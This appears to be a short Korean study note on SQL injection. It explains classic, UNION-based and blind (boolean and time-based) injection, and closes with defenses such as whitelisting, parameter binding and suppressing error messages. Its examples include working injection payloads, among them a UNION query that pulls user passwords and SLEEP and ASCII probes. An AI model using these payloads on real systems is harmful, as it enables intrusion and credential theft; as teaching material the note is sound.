## 종류
* Sql Injection : sql 구문의 논리적 오류를 사용해서 데이터를 가져온다.
```sql
    SELECT * FROM User WHRE id = 'id1' AND password = 'password1' 
    # id1에 'OR 1=1-- 이들어가면 WHERE절이 참이 되고 뒤에는 주석처리된다.
```
```sql
    SELECT id,title,content FROM Post WHERE title LIKE '%title1%' 
    # title1에 'UNION SELECT id,name,password FROM User-- 이 들어가면 
    # User 테이블과 union이 되어서 조회가 되고 뒤에는 주석처리된다.
```

* Blind Injection : 쿼리의 참/거짓 결과값으로부터 DB 정보를 유추한다.
```sql
    SELECT * FROM User WHERE id = 'id1'
    # 가입한 id를 사용하고 id1에 id1' AND ASCII(SUBSTR(SELECT TABLE_NAME
    # FROM information_schema.tables WHERE TABLE_TYPE='BASE TABLE' limit 0,1),1,1)) = 65--
    # 이 들어가면 입력한 숫자와 테이블 이름의 아스키코드값과의 일치여부를 알 수 있어서 
    # 여러번의 시도로 테이블 이름을 알아낼수있다.  
```
```sql
    SELECT * FROM User WHERE id = 'id1'
    # 가입한 id를 사용하고 id1에 id1' OR (LENGTH(DATABASE())=1 AND SLEEP(5))-- 
    # 이 들어가면 sleep 여부를 통해 입력한 숫자와 데이터베이스 이름의 길이의 일치여부를 알 수 있다.
```
## 방어
* 입력값에 대한 검증으로 화이트리스트 방식을 사용해서 여러가지 경우의 수를 방지한다.
* parameter binding을 사용해서 이스케이프를 통해서 입력값이 쿼리구문의 구조를 변경하지 못하도록 한다. 
* sql 오류결과를 외부로 유출하면 해커에게 hint가 되므로 메시지를 유출되지 않도록 한다.

